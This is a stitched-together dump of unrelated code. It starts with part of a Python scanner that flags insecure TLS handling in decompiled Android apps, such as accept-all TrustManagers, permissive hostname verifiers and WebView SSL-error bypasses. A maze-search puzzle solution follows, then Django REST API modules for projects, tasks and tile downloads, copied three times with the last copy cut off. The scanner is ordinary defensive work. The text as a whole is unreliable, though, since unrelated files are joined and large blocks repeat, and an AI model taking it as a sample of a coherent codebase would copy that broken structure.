                methodInstructions = self.getMethodCompleteInstructions('/.method .* verify(Ljava\/lang\/String;Ljavax\/net\/ssl\/SSLSession;)Z/,/^.end method/p',location)
                if methodInstructions != "":
                    if self.doesMethodReturnTrue(methodInstructions) == True:
                        self.vulnerableHostnameVerifiers.append(location)

    #Check for the presence of the custom function that allows to bypass SSL errors in WebViews

    def checkWebviewSSLErrorBypass(self):
        webviewErrorBypassLocations = self.checkForExistenceInFolder("Landroid\/webkit\/SslErrorHandler;->proceed\(\)V",self.getSmaliPaths())
        if webviewErrorBypassLocations[0] != '':
            for location in webviewErrorBypassLocations:
                self.vulnerableWebViewSSLErrorBypass.append(location)

    #Check for the presence of custom TrustManagers that are vulnerable.

    def checkVulnerableTrustManagers(self):
        vulnerableTrustManagers = []
        try:
            checkClientTrustedLocations = self.checkForExistenceInFolder(".method public checkClientTrusted\(\[Ljava\/security\/cert\/X509Certificate;Ljava\/lang\/String;\)V",self.getSmaliPaths())
            if checkClientTrustedLocations[0] != '':
                for location in checkClientTrustedLocations:
                    methodInstructions = self.getMethodCompleteInstructions('/method public checkClientTrusted\(\)/,/^.end method/p',location)
                    if methodInstructions != "":
                        if self.isMethodEmpty(methodInstructions) == True:
                            getAcceptedIssuersLocations = self.existsInFile(".method public getAcceptedIssuers\(\)\[Ljava\/security\/cert\/X509Certificate;",location)
                            if methodInstructions != "":
                                methodInstructions = self.getMethodCompleteInstructions('/method public getAcceptedIssuers()\[Ljava\/security\/cert\/X509Certificate;/,/^.end method/p',getAcceptedIssuersLocations[0])
                                if self.doesMethodReturnNull(methodInstructions) == True:
                                    checkServerTrustedLocations = self.existsInFile(".method public checkServerTrusted\(\[Ljava\/security\/cert\/X509Certificate;Ljava\/lang\/String;\)V",location)
                                    if methodInstructions != "":
                                        methodInstructions = self.getMethodCompleteInstructions('/method public checkServerTrusted\(\)/,/^.end method/p', checkServerTrustedLocations[0])
                                        if self.isMethodEmpty(methodInstructions) == True:
                                            vulnerableTrustManagers.append(location)
                                            self.vulnerableTrustManagers.append(location)
                return vulnerableTrustManagers
        except NotFound:
            pass

    #Check for the presence of setHostnameVerifier with ALLOW_ALL_HOSTNAME_VERIFIER

    def checkVulnerableHostnameVerifiers(self):
        setHostnameVerifierLocations = self.checkForExistenceInFolder("invoke-virtual {(.*)}, Lorg\/apache\/http\/conn\/ssl\/SSLSocketFactory;->setHostnameVerifier\(Lorg\/apache\/http\/conn\/ssl\/X509HostnameVerifier;\)V",self.getSmaliPaths())
        if setHostnameVerifierLocations[0] != "":
            for location in setHostnameVerifierLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"Lorg/apache/http/conn/ssl/SSLSocketFactory;->setHostnameVerifier")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                        if self.findRegisterAssignedValueFromIndexBackwards(instructions, registers[1], index) == "Lorg/apache/http/conn/ssl/SSLSocketFactory;->ALLOW_ALL_HOSTNAME_VERIFIER:Lorg/apache/http/conn/ssl/X509HostnameVerifier;":
                            self.vulnerableSetHostnameVerifiers.append(location)

    #Check for SocketFactory without Hostname Verify

    def checkVulnerableSockets(self):
        vulnerableSocketsLocations = self.checkForExistenceInFolder("Ljavax\/net\/SocketFactory;->createSocket\(Ljava\/lang\/String;I\)Ljava\/net\/Socket;",self.getSmaliPaths())
        if vulnerableSocketsLocations[0] != "":
            for location in vulnerableSocketsLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"Ljavax/net/ssl/HostnameVerifier;->verify\(Ljava/lang/String;Ljavax/net/ssl/SSLSession;\)Z")
                if len(indexList) == 0:
                    self.vulnerableSocketsLocations.append(location)

    #Check for the implementation of OKHttp Certificate Pinning

    def checkOKHttpCertificatePinning(self):
        okHttpCertificatePinningLocations = self.checkForExistenceInFolder("add\(Ljava\/lang\/String;\[Ljava\/lang\/String;\)Lokhttp3\/CertificatePinner\$Builder",self.getSmaliPaths())
        if okHttpCertificatePinningLocations[0] != '':
            for location in okHttpCertificatePinningLocations:
                #Bypass library files
                if "/okhttp" in location:
                    continue
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"certificatePinner\(Lokhttp3/CertificatePinner;\)Lokhttp3/OkHttpClient$Builder;")
                if len(indexList) == 0:
                    self.okHttpCertificatePinningLocation.append(location)

    #Check for custom Certificate Pinning Implementation

    def checkCustomPinningImplementation(self):
        customCertificatePinningLocations = self.checkForExistenceInFolder("invoke-virtual {(.*)}, Ljavax\/net\/ssl\/TrustManagerFactory;->init\(Ljava\/security\/KeyStore;\)V",self.getSmaliPaths())
        if customCertificatePinningLocations[0] != '':
            for location in customCertificatePinningLocations:
                if "/okhttp" in location or "io/fabric" in location:
                    continue
                self.customCertifificatePinningLocation.append(location)


    # *** CUSTOM CHECKS ***


    def findCustomChecks(self):
        for check in self.configuration.getCustomChecks():
                self.customChecksLocations[check[0]] = []
                customCheckLocationsFound = self.checkForExistenceInFolder(check[1],self.getSmaliPaths())
                if customCheckLocationsFound[0] != '':
                    for location in customCheckLocationsFound:
                        self.customChecksLocations[check[0]].append(location)
    # *** GETTERS ***

    def getVulnerableTrustManagers(self):
        return self.vulnerableTrustManagers

    def getVulnerableWebViewSSLErrorBypass(self):
        return self.vulnerableWebViewSSLErrorBypass

    def getVulnerableHostnameVerifiers(self):
        return self.vulnerableHostnameVerifiers

    def getEncryptionFunctionsLocations(self):
        return self.encryptionFunctionsLocation

    def getDecryptionFunctionsLocations(self):
        return self.decryptionFunctionsLocation

    def getUndeterminedCryptographicFunctionsLocations(self):
        return self.undeterminedCryptographicFunctionsLocation

    def getVulnerableSetHostnameVerifier(self):
        return self.vulnerableSetHostnameVerifiers

    def getVulnerableSockets(self):
        return self.vulnerableSocketsLocations

    def getWebViewsLoadUrlUsageLocations(self):
        return self.webViewLoadUrlUsageLocation

    def getCustomChecksLocations(self):
        return self.customChecksLocations

    def getWebviewAddJavascriptInterfaceLocations(self):
        return self.webViewAddJavascriptInterfaceUsageLocation

    def getAESwithECBLocations(self):
        return self.AESwithECBLocations

    def getDESLocations(self):
        return self.DESLocations

    def getJavascriptEnabledWebViews(self):
        return self.javascriptEnabledWebviews

    def getFileAccessEnabledWebViews(self):
        return self.fileAccessEnabledWebviews

    def getUniversalAccessFromFileURLEnabledWebviewsLocations(self):
        return self.universalAccessFromFileURLEnabledWebviewsLocations

    def getOkHTTPCertificatePinningLocations(self):
        return self.okHttpCertificatePinningLocation

    def getCustomCertificatePinningLocations(self):
        return self.customCertifificatePinningLocation

    def getKeystoreLocations(self):
        return self.keystoreLocations

    def getDynamicRegisteredBroadcastReceiversLocations(self):
        return self.dynamicRegisteredBroadcastReceiversLocations

import operator
from collections import deque


def isopen(location):                    
    x, y = location                    
    num = x*x + 3*x + 2*x*y + y + y*y + 1358

    return x >= 0 and y >= 0 and bin(num).count('1') % 2 == 0                    


def search(*, start=(1, 1), target=(5000, 5000), count=0):                    
    q = deque([start])                    
    costs = {start: 0}                    

    while q:
        location = q.popleft()

        for delta in ((-1, 0), (1, 0), (0, -1), (0, 1)):
            neighbor = tuple(map(operator.add, location, delta))
            cost = costs[location] + 1

            if isopen(neighbor):                    
                if neighbor == target:                    
                    return cost                    

                if neighbor not in costs or costs[neighbor] > cost:                    
                    costs[neighbor] = cost                    
                    q.append(neighbor)                    

    return len(list(filter(lambda c: c <= count, costs.values())))


print('Part 1:', search(target=(31, 39)))
print('Part 2:', search(count=50))

from django.core.exceptions import ObjectDoesNotExist                    
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }                    

import mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist                    
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json                    

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """
        Retrieve the console output for this task.
        An optional "line" query param can be passed to retrieve
        only the output starting from a certain line number.
        """
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or ""
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({"id": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail="Cannot create task, input provided is not valid.")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="", x="", y=""):
        """
        Get an orthophoto tile
        """
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, "rb")
            return HttpResponse(FileWrapper(tile), content_type="image/png")
        else:
            raise exceptions.NotFound()                    


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """
        Get tile.json for this tasks's orthophoto
        """
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast("orthophoto", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):                    
        def get(self, request, pk=None, project_pk=None, asset=""):
            """
            Downloads a task asset (if available)
            """
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound("Asset does not exist")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, "rb")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or "application/zip"))
                response['Content-Disposition'] = "attachment; filename={}".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()                    

from django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets                    
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),                    

    url(r'^auth/', include('rest_framework.urls')),
]

from django.core.exceptions import ObjectDoesNotExist                    
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }                    

import mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist                    
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json                    

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """
        Retrieve the console output for this task.
        An optional "line" query param can be passed to retrieve
        only the output starting from a certain line number.
        """
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or ""
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({"id": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail="Cannot create task, input provided is not valid.")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="", x="", y=""):
        """
        Get an orthophoto tile
        """
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, "rb")
            return HttpResponse(FileWrapper(tile), content_type="image/png")
        else:
            raise exceptions.NotFound()                    


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """
        Get tile.json for this tasks's orthophoto
        """
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast("orthophoto", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


class TaskAssets(TaskNestedView):                    
        def get(self, request, pk=None, project_pk=None, asset=""):
            """
            Downloads a task asset (if available)
            """
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound("Asset does not exist")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, "rb")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or "application/zip"))
                response['Content-Disposition'] = "attachment; filename={}".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()                    

from django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskAssets                    
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskAssets.as_view()),                    

    url(r'^auth/', include('rest_framework.urls')),
]

from django.core.exceptions import ObjectDoesNotExist                    
from rest_framework import exceptions

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }                    

import mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist                    
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json                    

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """
        Retrieve the console output for this task.
        An optional "line" query param can be passed to retrieve
        only the output starting from a certain line number.
        """
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or ""
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({"id": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail="Cannot create task, input provided is not valid.")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()                    

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

